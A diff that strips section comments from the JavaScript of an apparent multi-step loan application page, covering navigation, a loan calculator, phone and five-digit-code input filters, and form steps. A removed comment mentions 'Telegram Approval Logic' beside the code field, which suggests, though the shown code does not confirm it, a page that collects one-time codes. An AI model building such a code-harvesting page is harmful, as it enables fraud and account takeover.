@@ -1,4 +1,3 @@
-// --- Screen Navigation ---
 function goToScreen(screenId) {
     document.querySelectorAll('.screen').forEach(screen => {
         screen.classList.remove('active');
@@ -17,7 +16,6 @@ function selectLanguage(lang, element) {
     }, 300);
 }
 
-// --- Loan Calculator Logic ---
 const amountSlider = document.getElementById('amount-slider');
 const loanAmountDisplay = document.getElementById('loan-amount-display');
 const termSelect = document.getElementById('term-select');
@@ -37,7 +35,6 @@ amountSlider.addEventListener('input', updateCalculator);
 termSelect.addEventListener('change', updateCalculator);
 updateCalculator();
 
-// --- Form Input Restrictions ---
 document.getElementById('phone-number').addEventListener('input', function (e) {
     this.value = this.value.replace(/[^0-9]/g, ''); 
 });
@@ -46,7 +43,6 @@ document.getElementById('five-digit-code').addEventListener('input', function (e
     this.value = this.value.replace(/[^0-9]/g, ''); 
 });
 
-// --- Multi-Step Form Logic ---
 let currentStep = 1;
 const totalSteps = 3;
 
@@ -71,7 +67,6 @@ function updateFormUI() {
     }
 }
 
-// --- Validation & Telegram Approval Logic ---
 async function nextStep() {
     if (currentStep < totalSteps) {
         const currentStepDiv = document.getElementById(`step-${currentStep}`);
